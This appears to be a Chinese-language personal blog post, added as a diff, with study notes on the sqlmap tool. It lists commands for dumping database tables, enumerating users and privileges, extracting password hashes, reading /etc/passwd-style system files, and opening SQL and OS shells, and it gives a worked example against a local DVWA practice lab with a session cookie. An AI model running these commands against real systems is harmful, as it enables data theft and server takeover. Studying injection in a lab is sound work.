@@ -1,0 +1,114 @@
+Title:Sqlmap 记录
+Keywords:
+Catagory:
+Description:
+Author:B25S
+license:
+
+-----
+<article>
+	<p>Sqlmap 基础</p>
+	<p>在执行所有的命令时候，可以使用-v 3来查看sqlmap使用的注入payload。</p>
+	<ol>
+		<li>
+			<p>针对URL的注入</p>
+			<pre>
+				<code>
+					python sqlmap.py -u "url" 
+				</code>
+			</pre>
+		</li>
+		<li>
+			<p>数据读取</p>
+			<pre>
+				获取url下的testdb数据库下的users表下的2-4列:
+				<code>
+					python sqlmap.py -u "url" --dump -T "users" -D "testdb"  --start 2 --stop 4
+				</code>
+			</pre>
+		</li>
+		<li>
+			<p>查看(当前)用户</p>
+			<pre>
+				<code>
+					python sqlmap.py -u "url" --users
+					python sqlmap.py -u "url" --current-user
+				</code>
+			</pre>
+		</li>
+		<li>
+			<p>查看(所有)用户权限，如果这个是Usage的话是不能够进行文件上传和文件读取的，Usage权限的用户是最低的。</p>
+			<pre>
+				<code>
+					python sqlmap.py -u "url" --privileges
+				</code>
+				一般确定身份来判断是否有足够权限提权，同样可以使用下面命令判断是否为dba身份:
+				<code>
+					python sqlmap.py -u "url" --is-dba
+				</code>
+			</pre>
+		</li>
+		<li>
+			<p>查看(所有)hash值形式的密码</p>
+			<pre>
+				<code>
+					python sqlmap.py -u "url" --passwords
+				</code>
+			</pre>
+		</li>
+		<li>
+			<p>利用mysql的file_load()函数读取文件</p>
+			<pre>
+				<code>
+					python sqlmap.py -u "url" --file-read /etc/password
+				</code>
+			</pre>
+		</li>
+		<li>
+			<p>执行SQL</p>
+			<pre>
+				<code>
+					python sqlmap.py -u "url" --sql-shell
+				</code>
+			</pre>
+		</li>
+		<li>
+			<p>以mysql身份获取一个系统的shell</p>
+			<pre>
+				<code>
+					python sqlmap.py -u "url" --os-shell
+				</code>
+			</pre>
+		</li>
+	</ol>
+	<br>
+	<p>
+	cookie的利用<br>
+	可以用tamper来获取cookie值(FIREFOX自带的IDE也可以)，然后配合--cookie来注入
+		<pre>
+			<code>
+				python sqlmap.py -u "url" --cookie="xxx"
+			</code>
+		</pre>
+	<br>
+	以DVWA为例子:
+		<pre>
+			url-->http://192.168.66.132/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#<br>
+			cookie-->security=low; SL_lng_from=auto; SL_lng_to=es; SLloc=false; PHPSESSID=d0lvde5o8n3hl13ro931uj25q5
+			<code>
+				python sqlmap.py -u "http://192.168.66.132/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; SL_lng_from=auto; SL_lng_to=es; SLloc=false; PHPSESSID=d0lvde5o8n3hl13ro931uj25q5"
+			</code>
+		</pre>
+	</p>
+		<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ol>
+		<li>
+			<p>使用--file-read参数下载到的/etc/passwd文件只有一个'?'字符，换成了/etc/profile文件又是完整的，什么原因?</p>
+		</li>
+		<li>
+			<p>尚不清楚sql shell使用方式。</p>
+		</li>
+		<li>
+			<p>os-shell中需要提供服务器根目录，尚不清楚寻找方法。</p>
+		</li>
+	</ol>
+</article>
